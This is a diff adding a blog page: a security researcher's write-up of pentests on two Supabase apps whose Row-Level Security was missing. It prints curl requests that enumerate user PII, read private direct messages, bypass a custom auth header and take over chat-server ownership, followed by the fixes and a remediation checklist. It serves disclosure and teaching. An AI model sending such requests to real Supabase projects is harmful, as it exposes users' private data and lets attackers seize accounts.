@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cyberpunk nonsense and writeups">
+    
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" 
+          integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" 
+          integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    <link rel="stylesheet" href="/css/custom.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    
+    
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    
+    <title>
+        
+            Supabase Shenanigans | Skelli
+        
+    </title>
+    
+    
+    <meta name="theme-color" content="#000000">
+</head> <body style="background-color: black; color: #d8e8ff;">
+    <div class="mainbg">
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <span class="terminal-title">Supabase Shenanigans ~ warp</span>
+                <span class="terminal-controls">
+                    <span class="control"></span>
+                    <span class="control"></span>
+                    <span class="control"></span>
+                </span>
+            </div>
+            <div class="terminal-content">
+                <p class="terminal-prompt">skelli@macbook ~ % cd posts</p>
+                <p class="terminal-prompt">skelli@macbook ~/posts % cat supabase-shenanigans.md</p>
+                
+                <div class="content-title">
+                    <h1>Supabase Shenanigans</h1>
+                    
+                    <p class="terminal-date">February 20, 2026</p>
+                    
+                </div>
+                
+                <div class="content">
+                    <h2 id="too-long-didnt-read">Too Long, Didn&rsquo;t Read</h2>
+<p>I pentested two separate apps built on Supabase in one week. Both had Row-Level Security disabled. One let me gather all users full names and emails. The other let me take over any server on the platform with a single curl command, or read every user&rsquo;s private messages. This is that story.</p>
+<hr>
+<h2 id="the-preface">The Preface</h2>
+<p>I offer free pentests to friends, family, and budding developers just setting up their websites and apps. It&rsquo;s good practice for me, and it benefits them. Not to mention, I almost always find something. <em>That&rsquo;s how the first engagement in this post came about</em>, a friend&rsquo;s personal project. The second engagement is different: Discord Alternative, a Discord-like chat platform, was recommended to me by a friend; I tested it as part of volunteer security research and accidentally stumbled upon these vulnerabilities. So: one free pentest for a friend, one volunteer assessment for a product I didn&rsquo;t build.</p>
+<p>Both apps are built on Supabase. Both had the same class of vulnerability, and both taught me something about how developers keep making the same mistake, even when Supabase practically begs you not to in the docs.</p>
+<h2 id="what-is-row-level-security-rls">What is Row-Level Security (RLS)?</h2>
+<p>If you&rsquo;re not familiar with Supabase or PostgreSQL: <strong>Row-Level Security (RLS)</strong> is a database feature that restricts <em>which rows</em> a user can read or modify. Without RLS, anyone who can hit your API (and the anon key is in your frontend code) can query every row in a table. With RLS, you define policies like <em>&ldquo;users can only SELECT rows where <code>user_id = auth.uid()</code>&rdquo;</em> , so each user only sees their own data. Supabase supports RLS but it&rsquo;s off by default; if you don&rsquo;t enable it and write policies, your tables are wide open. Both of these apps had RLS disabled or bypassed, which is why the findings were so severe.</p>
+<hr>
+<h1 id="part-one-photo-sharing-app--the-bug-that-kept-coming-back">Part One: Photo Sharing App — The Bug That Kept Coming Back</h1>
+<h3 id="the-setup">The Setup</h3>
+<p>I went to my friend&rsquo;s house on a Wednesday, a weekly ritual of gaming and bonding. We catch up, play games, talk about work, and watch RuPaul&rsquo;s Drag Race. During one of my visits, my friend asked if I&rsquo;d pentest his app for him. I couldn&rsquo;t have been happier. He&rsquo;s a talented developer, working in a fullstack position at his day job, and decided to try vibecoding for his hobby project. That only heightened my excitement. Who would say no to testing AI code? So I did what any good friend would do: tried to break into his database.</p>
+<h3 id="discovery">Discovery</h3>
+<p>I spun up Burp Suite Pro, opened my terminal, and started making cURL requests. I looked for unauthenticated attacks first, then made a researcher account and poked at every input field I could find. XSS, XXE, parameter tampering, not much low-hanging fruit. My spouse had already pentested this previously and caught an XSS, so I knew the easy stuff was already reported.</p>
+<p>Then I spotted Supabase references in the JavaScript, and I started probing the REST API.</p>
+<h3 id="the-first-finding--unauthenticated-pii-exposure">The First Finding — Unauthenticated PII Exposure</h3>
+<p>Supabase auto-generates REST endpoints for every table. I started with the obvious one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=email,first_name,last_name&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [MY_TOKEN]&#34;</span>
+</span></span></code></pre></div><p>The response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;asd&#34;</span>},
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>},
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;researcher@skelli.win&#34;</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;Eden&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;Stroet&#34;</span>}
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// ... 25 more users
+</span></span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>No Row-Level Security. Supabase is permissive by default, if you don&rsquo;t explicitly enable RLS and write policies, every row is readable by anyone with the anon key, and the anon key is always public, baked into the frontend JavaScript, which is intentionally done by Supabase.</p>
+<p>Within minutes of testing I already turned to my friend and said: &ldquo;Found something. It&rsquo;s bad.&rdquo;</p>
+<h3 id="the-collection-association-attack">The Collection Association Attack</h3>
+<p>While digging deeper I found something more creative, an RPC function called <code>add_person_to_collection</code>. You could add <em>any</em> user to <em>your</em> collection without their consent, then query <code>get_visible_people</code> to extract their full profile:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Add victim to your collection</span>
+</span></span><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/rpc/add_person_to_collection&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [TOKEN]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;p_collection_id&#34;:&#34;YOUR_ID&#34;,&#34;p_user_id&#34;:&#34;VICTIM_ID&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Get their full PII</span>
+</span></span><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/rpc/get_visible_people&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [TOKEN]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;p_collection_ids&#34;:[&#34;YOUR_ID&#34;]}&#39;</span>
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;d4425e38-0c27-4e20-aff3-f36e961c97d5&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;My&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;Friend&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;myfriend@gmail.com&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;handle&#34;</span>: <span style="color:#e6db74">&#34;FriendsUsername&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;profile_picture&#34;</span>: <span style="color:#e6db74">&#34;https://...&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Full PII. Email, name, handle, profile picture, mouth-watering stuff really.</p>
+<p>I also found a debug function in production (<code>test_rls_condition</code>), an unauthenticated RPC that could modify any user&rsquo;s subscription data (<code>accrue_read_only_access</code>), full GraphQL introspection (82 mutations, 20+ tables visible), and a broken recursive RLS policy on <code>family_members</code> that was leaking PostgreSQL error <code>42P17</code> in API responses.</p>
+<p>I was originally planning to head home by 23:00, but when you feel that adrenaline from hacking, you tend to lose track of time. You become so immersed in the project seeing how far you can take it. I stayed until 2AM because I get so addicted to that rush when you find something and you can&rsquo;t stop digging. I documented everything and sent the full report before I left.</p>
+<h3 id="the-first-fix--column-hiding-vs-row-security">The First &ldquo;Fix&rdquo; — Column Hiding vs Row Security</h3>
+<p>He patched through the night. I tested the fix the next day:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=email,first_name,last_name&amp;limit=28&#34;</span>
+</span></span></code></pre></div><p>The emails were gone. Progress! But the names were still there. All 28 users, full names visible. He&rsquo;d hidden the <code>email</code> column but forgotten to apply that fix for <code>first_name</code> and <code>last_name</code> too, and more importantly, I could still see <em>everyone&rsquo;s rows</em>, not just mine.</p>
+<p>The distinction matters:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- What he did: column-level hiding
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">REVOKE</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">ON</span> users.email <span style="color:#66d9ef">FROM</span> authenticated;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- What he needed: row-level security
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> POLICY <span style="color:#e6db74">&#34;users_select&#34;</span> <span style="color:#66d9ef">ON</span> users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FOR</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">USING</span> (user_id <span style="color:#f92672">=</span> auth.uid());
+</span></span></code></pre></div><p>Column security hides a field. Row security controls <em>which rows you can see at all</em>.</p>
+<h3 id="the-second-death--yet-another-bypass">The Second Death — Yet Another Bypass</h3>
+<p>After disclosing that bypass, I tried my luck again. The bypass I found this time, worked. I texted him the cURL commands showing I could still enumerate first names, last names, and user IDs across all 28 accounts. He groaned, grabbed his laptop, and started patching again.</p>
+<h3 id="the-real-fix">The Real Fix</h3>
+<p>A few days later I tested again expecting another bypass. Instead:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=first_name,last_name&amp;limit=28&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;Eden&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;Stroet&#34;</span>}]
+</span></span></code></pre></div><p>One record. Just me. He&rsquo;d finally implemented proper RLS: <code>FOR SELECT USING (user_id = auth.uid())</code>. A few hours later, GraphQL introspection was disabled too. The bug was dead. I wish more companies patched that fast. Often times I&rsquo;d be in the middle of testing and suddenly things that I had found would break because he&rsquo;d be patching during testing. I admire that dedication to security.</p>
+<hr>
+<h1 id="part-two-discord-alternative--when-the-whole-platform-is-open">Part Two: Discord Alternative — When the Whole Platform Is Open</h1>
+<p>Discord Alternative is a Discord-like chat application. It has servers, channels, direct messages, voice rooms. It&rsquo;s a real product with real users, built by a small team using React on the frontend and Supabase on the backend. I tested it as part of my volunteer security research and disclosed everything to the team, who were receptive and responsive throughout. Like my friend, they are also pretty dedicated to security.</p>
+<p>They soft launched their platform 3 weeks ago with just 20 users and within those 3 weeks, the platform gained 12k users! The team at the time was just two people, and this provided a lot of struggles for them. It went from a small test user base to actively firefighting reported issues that 12k users would bring.</p>
+<h3 id="authentication-architecture">Authentication Architecture</h3>
+<p>Before diving into the findings, it&rsquo;s worth understanding how Discord Alternative&rsquo;s auth works, because it&rsquo;s the root cause of everything.</p>
+<p>Rather than using Supabase Auth (which issues proper JWTs and populates <code>auth.uid()</code> at the database level), Discord Alternative implemented a custom authentication system using a secret key hash. At registration, a 64-character hex key is generated, hashed, and stored. On login, you send the hash in an <code>X-Key-Hash</code> header.</p>
+<p>The problem? This validation only happens at the <em>middleware layer</em>. The Supabase REST API is directly accessible, and it has no idea what an <code>X-Key-Hash</code> is. As far as Supabase is concerned, <code>auth.uid()</code> is always null, meaning any RLS policy that relies on it does nothing.</p>
+<h3 id="finding-1--authentication-bypass">Finding 1 — Authentication Bypass</h3>
+<p>The custom auth header is completely ignored at the REST layer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Valid key hash</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://[REDACTED].supabase.co/rest/v1/users&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [ANON_KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;X-Key-Hash: [VALID_HASH]&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Garbage key hash — identical response</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://[REDACTED].supabase.co/rest/v1/users&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [ANON_KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;X-Key-Hash: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
+</span></span></code></pre></div><p>Both return the same data. The auth check simply doesn&rsquo;t exist at this layer.</p>
+<h3 id="finding-2--mass-pii-exposure-8799-users">Finding 2 — Mass PII Exposure: 8,799 Users</h3>
+<p>With no RLS SELECT policies on the <code>users</code> table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://[REDACTED].supabase.co/rest/v1/users?select=*&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [ANON_KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [ANON_KEY]&#34;</span>
+</span></span></code></pre></div><p>Every user account on the platform (8,799 in total) is readable by anyone. Usernames, display names, avatar URLs, bio, status, pronouns, profile themes, creation timestamps, last seen timestamps. It looked like this:</p>
+<pre tabindex="0"><code>[
+  {
+    &#34;id&#34;: &#34;59390f47-cf1d-4587-b7fe-bded91d89cd4&#34;,
+    &#34;username&#34;: &#34;test1234&#34;,
+    &#34;display_name&#34;: null,
+    &#34;avatar_url&#34;: null,
+    &#34;banner_color&#34;: &#34;#5865F2&#34;,
+    &#34;bio&#34;: null,
+    &#34;status&#34;: &#34;online&#34;,
+    &#34;custom_status&#34;: null,
+    &#34;created_at&#34;: &#34;2026-01-07T22:29:12.412199+00:00&#34;,
+    &#34;last_seen&#34;: &#34;2026-01-07T22:29:12.412199+00:00&#34;,
+    &#34;avatar_decoration&#34;: null,
+    &#34;profile_theme_primary&#34;: null,
+    &#34;profile_theme_accent&#34;: null,
+    &#34;banner_url&#34;: null,
+    &#34;profile_effect&#34;: null,
+    &#34;pronouns&#34;: null
+  },
+</code></pre><p>While this doesn&rsquo;t disclose anything sensitive yet, it would play a bigger part in something more sinister if someone else had found it before I did.</p>
+<h3 id="finding-3--6467-private-direct-messages-exposed">Finding 3 — 6,467 Private Direct Messages Exposed</h3>
+<p>The <code>direct_messages</code> table had no RLS SELECT policy either:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://[REDACTED].supabase.co/rest/v1/direct_messages?select=*&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [ANON_KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [ANON_KEY]&#34;</span>
+</span></span></code></pre></div><pre tabindex="0"><code>Content-Range: 0-999/6467
+</code></pre><p>6,467 private DMs. All readable. No authentication required.</p>
+<p>Discord Alternative markets itself as a privacy-focused platform — the encryption key tables (<code>user_identity_keys</code>, <code>user_prekeys</code>, <code>user_signed_prekeys</code>) existed in the schema, and the team had clearly thought about E2E encryption — but the messages themselves were sitting in plaintext, fully exposed.</p>
+<p><code>INSERT</code> and <code>DELETE</code> operations were correctly blocked by RLS policies. The developers had written protection for write operations but forgotten <code>SELECT</code> entirely. A very easy mistake to make, with very serious consequences.</p>
+<h3 id="finding-4---privilege-escalation-via-server-ownership-takeover">Finding 4 —  Privilege Escalation via Server Ownership Takeover</h3>
+<p>This was the most impactful finding, and the simplest. The <code>servers</code> table had no RLS UPDATE policy, which meant anyone could PATCH it directly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X PATCH <span style="color:#e6db74">&#34;https://[REDACTED].supabase.co/rest/v1/servers?id=eq.[TARGET_SERVER_ID]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [ANON_KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [ANON_KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;owner_id&#34;:&#34;[ATTACKER_USER_ID]&#34;}&#39;</span>
+</span></span></code></pre></div><p>Empty response. 204 No Content.</p>
+<p>This one was a funny finding. First off, I was half-asleep, so when the content had returned completely empty I thought it had failed. It was maybe 1AM at this point and I wasn&rsquo;t really paying attention. I thought nothing of it and went to bed. My second mistake here was that I had mixed up the server ID&rsquo;s and used the main Discord Alternative Community server which is used to communicate to the users of the platform&hellip; I just stole the community from the Founder. In between my first disclosure and this one, I was actually invited to join their team as a volunteer pentester, which I obliged because I was having fun, and I can see their vision. This gave me access to their Slack, where one of the members posted an image in panic asking who had taken over the community server&hellip; it was me. A lot of apologizing on my side, a quick transfer back and a good laugh was had. However, it was very apparent that anyone could do this, so it had to be patched quickly.</p>
+<p><strong>Fix:</strong> <code>CREATE POLICY &quot;server_owner_update&quot; ON servers FOR UPDATE USING (owner_id = auth.uid());</code></p>
+<h3 id="the-root-cause">The Root Cause</h3>
+<p>All four findings share the same root cause: Discord Alternative&rsquo;s custom authentication bypasses Supabase&rsquo;s RLS system entirely. Because <code>auth.uid()</code> is always null, any policy that references it is effectively disabled. The architectural fix is to either migrate to Supabase Auth (issuing proper JWTs), or validate the custom <code>X-Key-Hash</code> in an Edge Function that then issues a user scoped JWT before hitting the database.</p>
+<hr>
+<h2 id="impact-assessment">Impact Assessment</h2>
+<h3 id="photo-sharing-app">Photo Sharing App</h3>
+<ul>
+<li>Full PII enumeration of all users (names, emails, handles, profile pictures)</li>
+<li>Unauthenticated modification of subscription data</li>
+<li>Broken access control on collection membership</li>
+</ul>
+<h3 id="discord-alternative">Discord Alternative</h3>
+<ul>
+<li>8,799 user accounts fully enumerable</li>
+<li>6,467 private direct messages readable by anyone</li>
+<li>Any server on the platform takeable with a single curl command</li>
+<li>Authentication mechanism completely bypassable at the REST layer</li>
+</ul>
+<hr>
+<h2 id="remediation">Remediation</h2>
+<h3 id="for-supabase-developers--the-checklist">For Supabase Developers — The Checklist</h3>
+<p><strong>1. Enable RLS on every table, immediately.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">ALTER</span> <span style="color:#66d9ef">TABLE</span> your_table ENABLE <span style="color:#66d9ef">ROW</span> <span style="color:#66d9ef">LEVEL</span> <span style="color:#66d9ef">SECURITY</span>;
+</span></span></code></pre></div><p><strong>2. Write SELECT policies, not just INSERT/DELETE.</strong>
+The most common mistake I see. Developers block writes but forget reads.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> POLICY <span style="color:#e6db74">&#34;users_own_row&#34;</span> <span style="color:#66d9ef">ON</span> users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FOR</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">USING</span> (auth.uid() <span style="color:#f92672">=</span> user_id);
+</span></span></code></pre></div><p><strong>3. Don&rsquo;t implement custom auth at the application layer.</strong>
+If you bypass Supabase Auth, you bypass RLS. Use Supabase Auth or issue proper JWTs from your middleware, and don&rsquo;t try to bolt authentication on top.</p>
+<p><strong>4. Audit your anon key exposure.</strong>
+The anon key is always public. Anything accessible with just the anon key is accessible to everyone on the internet. Design your RLS policies with this in mind.</p>
+<p><strong>5. Disable debug functions and GraphQL introspection in production.</strong>
+Functions named <code>test_rls_condition</code> and <code>debug_request_headers</code> have no business being in a production environment.</p>
+<hr>
+<h2 id="final-words">Final Words</h2>
+<p>Two apps, two entirely separate teams, the same vulnerability class. Supabase is a genuinely excellent platform, but its permissive defaults mean that a developer who doesn&rsquo;t understand RLS can ship a completely open database without realising it. The Supabase docs warn about this clearly, but in the excitement of shipping, it&rsquo;s easy to miss.</p>
+<p>Neither of these teams were careless. Both have talented developers building real things. The mistakes were subtle, architectural, and easy to make. Which is exactly why this class of vulnerability keeps showing up.</p>
+<p>If you&rsquo;re building on Supabase: enable RLS on every table before you write a single line of application code. Treat it like a seatbelt. You don&rsquo;t put it on after you crash.</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://supabase.com/docs/guides/auth/row-level-security">Supabase Row Level Security Documentation</a></li>
+<li><a href="https://supabase.com/docs/guides/auth">Supabase Auth Documentation</a></li>
+</ul>
+
+                </div>
+                
+                <p class="terminal-prompt">skelli@macbook ~/posts % cd ..</p>
+                <p class="terminal-prompt">skelli@macbook ~ % ls</p>
+                
+                <div class="mt-4">
+                    <a href="javascript:history.back()" class="btn btn-outline-light">← Back</a>
+                    <a href="/" class="btn btn-outline-light">Home</a>
+                </div>
+            </div>
+        </div>
+    </div>
+<footer class="footer py-3 mt-5">
+    <div class="container text-center">
+        <span class="text-muted">Still Hacking Anyway</span>
+    </div>
+    
+    
+    <script src="/js/script.js"></script>
+</footer> </body>
+</html> 
